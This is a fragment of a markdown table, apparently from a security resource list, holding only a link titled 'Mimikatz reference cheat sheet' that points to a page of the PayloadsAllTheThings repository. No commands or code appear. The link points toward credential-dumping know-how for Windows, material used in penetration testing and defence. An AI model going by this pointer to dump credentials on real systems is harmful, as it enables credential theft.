|             |                                                                                                                                                                                                                                                                                                                        |
|             | [Mimikatz reference cheat sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Mimikatz.md)                                                                                                                                                              |
|             |                                                                                                                                                                                                                                                                                                                        |